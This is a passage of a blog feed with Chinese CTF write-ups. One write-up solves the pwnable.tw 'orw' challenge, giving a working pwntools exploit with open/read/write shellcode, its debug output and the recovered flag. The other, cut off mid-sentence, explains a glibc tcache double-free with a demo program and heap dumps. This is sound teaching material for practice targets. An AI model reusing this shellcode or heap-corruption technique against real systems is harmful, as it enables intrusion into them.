8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。</p><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。<br>老规矩，检查一下文件的保护机制：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww<br>[*] <span class="hljs-string">'/mnt/hgfs/PWN\xe9\xa2\x98/Range/pwnable.xyz/orww'</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><p>可以看到程序为32位，只开启了NX保护。main函数如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>很简单，输入shellcode之后程序就会执行它。<br>还有一个问题，system和execve都被禁用了怎么办？<br>读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。<br>同时题目已经给予了这个提示：</p><p>因此这里考验我们直接编写shellcode的能力，这里注意<br>• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。<br>• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。<br>由于这道题是32位程序，因此编写shellcode如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>context.log_level=<span class="hljs-string">"debug"</span><br>p = remote(<span class="hljs-string">'chall.pwnable.tw'</span>, <span class="hljs-number">10001</span>)<br><br>shellcode_open = <span class="hljs-string">'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'</span><br>shellcode_read = <span class="hljs-string">'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'</span><br>shellcode_write = <span class="hljs-string">'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'</span><br>shellcode = shellcode_open + shellcode_read + shellcode_write<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br>p.recvuntil(<span class="hljs-string">':'</span>)<br>p.sendline(shellcode)<br>print p.recv()<br>p.interactive()<br><br><span class="hljs-string">'''</span><br>shellcode说明：                   <br>xor eax,eax      ;清空需要用到的寄存器<br>xor ebx,ebx<br>xor ecx,ecx<br>xor edx,edx<br><br><span class="hljs-meta">#fd = open(<span class="hljs-string">'/home/orw/flag'</span>,0)</span><br>push <span class="hljs-number">0x00006761</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6c662f77</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x726f2f65</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6d6f682f</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>mov ebx, esp;              ;<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *filename<br>mov eax, <span class="hljs-number">0x5</span>;              ;open函数的系统调用：sys_open<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><br><span class="hljs-meta">#read(fd,bss+0x200,0x40)</span><br>mov ebx, eax;              ;<span class="hljs-type">int</span> fd<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x3</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><span class="hljs-meta">#write(1,bss+0x200,0x40)</span><br>mov ebx, <span class="hljs-number">0x1</span>;              ;<span class="hljs-type">int</span> fd=<span class="hljs-number">1</span> (标准输出<span class="hljs-built_in">stdout</span>)(<span class="hljs-number">0</span> 标准输入，<span class="hljs-number">1</span> 标准输出，<span class="hljs-number">2</span> 标准错误输出)<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x4</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  others python orw_exp.py <br>[+] Opening connection to chall.pwnable.tw on port <span class="hljs-number">10001</span>: Done<br>[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2<span class="hljs-number">.7</span>/site-packages/pwnlib/data/includes /dev/<span class="hljs-built_in">stdin</span><br>[DEBUG] Assembling<br>    .section .shellcode,<span class="hljs-string">"awx"</span><br>    .global _start<br>    .global __start<br>    _start:<br>    __start:<br>    .intel_syntax noprefix<br>    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push <span class="hljs-number">0x00006761</span>;push <span class="hljs-number">0x6c662f77</span>;push <span class="hljs-number">0x726f2f65</span>;push <span class="hljs-number">0x6d6f682f</span>;mov ebx,esp;mov eax,<span class="hljs-number">0x5</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,eax;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x3</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,<span class="hljs-number">0x1</span>;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x4</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br>[DEBUG] /usr/bin/x86_64-linux-gnu-as <span class="hljs-number">-32</span> -o /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step2 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step1<br>[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step3 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step4<br>[DEBUG] Received <span class="hljs-number">0x17</span> bytes:<br>    <span class="hljs-string">'Give my your shellcode:'</span><br>[DEBUG] Sent <span class="hljs-number">0x4f</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">31</span> c0 <span class="hljs-number">31</span> db  <span class="hljs-number">31</span> c9 <span class="hljs-number">31</span> d2  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">2f</span>  │<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│hag·│·hw/│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">65</span>  <span class="hljs-number">2f</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">68</span>  <span class="hljs-number">2f</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>d  <span class="hljs-number">89</span> e3 b8 <span class="hljs-number">05</span>  │flhe│/orh│/hom│····│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd  <span class="hljs-number">80</span> <span class="hljs-number">89</span> c3 b9  <span class="hljs-number">60</span> a2 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  ba <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│`···│·@··│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> b8 <span class="hljs-number">03</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd <span class="hljs-number">80</span>  bb <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> b9 <span class="hljs-number">60</span> a2  │····│····│····│··`·│<br>    <span class="hljs-number">00000040</span>  <span class="hljs-number">04</span> <span class="hljs-number">08</span> ba <span class="hljs-number">40</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8  <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  cd <span class="hljs-number">80</span> <span class="hljs-number">0</span>a     │···@│····│····│···│<br>    <span class="hljs-number">0000004f</span><br>[DEBUG] Received <span class="hljs-number">0x40</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">46</span> <span class="hljs-number">4</span>c <span class="hljs-number">41</span> <span class="hljs-number">47</span>  <span class="hljs-number">7b</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span>  <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">63</span> <span class="hljs-number">30</span>  <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span>  │FLAG│{sh3│llc0│ding│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">5f</span> <span class="hljs-number">77</span> <span class="hljs-number">31</span> <span class="hljs-number">74</span>  <span class="hljs-number">68</span> <span class="hljs-number">5f</span> <span class="hljs-number">6f</span> <span class="hljs-number">70</span>  <span class="hljs-number">33</span> <span class="hljs-number">6</span>e <span class="hljs-number">5f</span> <span class="hljs-number">72</span>  <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span>  │_w1t│h_op│<span class="hljs-number">3</span>n_r│<span class="hljs-number">34</span>d_│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">77</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span>  <span class="hljs-number">33</span> <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │writ│<span class="hljs-number">3</span>}··│····│····│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│····│····│<br>    <span class="hljs-number">00000040</span><br>FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <br></code></pre></td></tr></tbody></table></figure><h2 id="prctl是否能绕过？"><a href="#prctl是否能绕过？" class="headerlink" title="prctl是否能绕过？"></a>prctl是否能绕过？</h2><p>可以，但是不会</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）&quot;&gt;&lt;a href=&quot;#初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）&quot; class=&quot;headerlink&quot; title=&quot;初探</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="orw" scheme="https://kylinxin.github.io/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Attack中的Tcache dup（基础）</title>
    <link href="https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/"/>
    <id>https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/</id>
    <published>2023-09-15T13:58:29.000Z</published>
    <updated>2023-09-14T14:03:05.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tcache-Attack中的Tcache-dup（基础）"><a href="#Tcache-Attack中的Tcache-dup（基础）" class="headerlink" title="Tcache Attack中的Tcache dup（基础）"></a><strong>Tcache Attack中的Tcache dup（基础）</strong></h1><blockquote><p>参考资料：CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup</a><br>代码汉化：@yichen：<a href="https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g">https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA">https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA</a>  密码: u7pc<br>–来自百度网盘超级会员V3的分享</p></blockquote><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>这里使用libc-2.27.so的源码进行分析</p></blockquote><p>Tcache dup利用的是tcache_put()函数的不严谨：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">#代码第<span class="hljs-number">2923</span><span class="hljs-number">-2933</span>行：<br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there's room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>}<br></code></pre></td></tr></tbody></table></figure><p>从上面的代码可以看出，在libc-2.27版本中没有对tcache_put函数进行检查，甚至没有对tcache-&gt;counts[tc_idx] 的检查，在大幅度提高性能的同时安全性也下降来许多。<br>因为在这个函数中没有任何的检查，<strong>所以我们可以直接对同一个chunk进行多次free，造成cyclical list。</strong></p><blockquote><p>Tcache dup类似于之前fastbin_attack中的double free，但是后者的检查要更多。</p></blockquote><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来进行说明。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"先申请一块内存\n"</span>);<br>    <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"申请的内存地址是: %p\n"</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"对这块内存地址 free两次\n"</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"这时候链表是这样的 [ %p, %p ].\n"</span>, a, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"接下来再去 malloc 两次: [ %p, %p ].\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Finish!!!\n"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>编译完成之后，使用pwndbg调试程序，首先对代码的第12行下断点，然后开始调试程序，此时的内存状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601250</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601270</span><br>Size: <span class="hljs-number">0x20d91</span><br><br>pwndbg&gt; x/<span class="hljs-number">100</span>gx <span class="hljs-number">0x601000</span><br><span class="hljs-number">0x601000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000251</span> #tcache_perthread_struct<br>......(省略内容均为空)<br><span class="hljs-number">0x601250</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x601260</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x601270</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020d91</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x601310</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; bin<br>tcachebins<br>empty<br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br>all: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dcfc40</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc50</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc60</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc70</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc80</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc90</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfca0</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000601270</span><span class="hljs-number">0x0000000000000000</span><br>    #指向top_chunk<br><span class="hljs-number">0x7ffff7dcfcb0</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dcfca0</span><span class="hljs-number">0x00007ffff7dcfca0</span><br>pwndbg&gt; <br><br></code></pre></td></tr></tbody></table></figure><p>由于在tcache_put函数中没有对堆块进行检查，接下来我们对malloc出的chunk进行多次free。<br>对代码的第15行下断点，继续调试：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000020x0000000000000000<br>    <span class="hljs-meta">#count=2</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #指向chunk1_data<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  2]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #指向top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的内存中可以看出，对chunk1进行两次free之后，在tcache中形成了cyclical 